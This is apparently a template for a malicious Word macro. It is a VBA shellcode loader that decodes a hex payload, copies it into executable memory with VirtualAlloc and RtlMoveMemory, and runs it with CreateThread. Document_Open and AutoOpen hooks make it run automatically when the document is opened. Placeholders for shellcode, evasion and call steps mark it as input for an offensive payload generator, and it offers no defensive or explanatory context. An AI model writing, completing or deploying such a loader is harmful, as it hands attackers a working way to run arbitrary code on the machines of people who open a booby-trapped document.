//####DEFINE####

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal lpDestination As Any, _
    ByVal lpSource As LongPtr, _
    ByVal cbLength As LongPtr)

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As LongPtr) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, _
    ByVal dwMilliseconds As Long) As Long

    

Const MEM_COMMIT As Long = &H1000
Const MEM_RESERVE As Long = &H2000
Const PAGE_EXECUTE_READWRITE As Long = &H40

//####CODE####

Sub JustE()

    //####EVASION####

    Dim buf As String
    ####SHELLCODE####

    ' Calculate the length
    Dim shellLength As Long
    shellLength = Len(buf) / 2

    ' Declare byteArray and populate it with buf
    Dim byteArray() As Byte
    ReDim byteArray(0 To shellLength - 1)

    Dim i As Long, pos As Long
    Dim Value As String

    For i = 0 To shellLength - 1
        If i = 0 Then
            pos = i + 1
        Else
            pos = i * 2 + 1
        End If
        Value = Mid(buf, pos, 2)
        byteArray(i) = Val("&H" & Value)
    Next

    //####CALL####

    ' Allocate executable memory
    Dim execMemory As LongPtr
    execMemory = VirtualAlloc(0, shellLength, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    If execMemory = 0 Then
        MsgBox "Memory allocation failed", vbCritical
        Exit Sub
    End If

    ' Use VarPtr to get the pointer to the byteArray(0)
    Call RtlMoveMemory(ByVal execMemory, ByVal VarPtr(byteArray(0)), shellLength)

    ' Create thread to execute the shellcode
    Dim hThread As LongPtr
    Dim threadId As LongPtr
    hThread = CreateThread(0, 0, execMemory, 0, 0, threadId)

    If hThread = 0 Then
        MsgBox "Thread creation failed", vbCritical
        Exit Sub
    End If

    ' Wait for the thread to finish
    Call WaitForSingleObject(hThread, -1)

End Sub

Sub Document_Open()
    JustE
End Sub

Sub AutoOpen()
    JustE
End Sub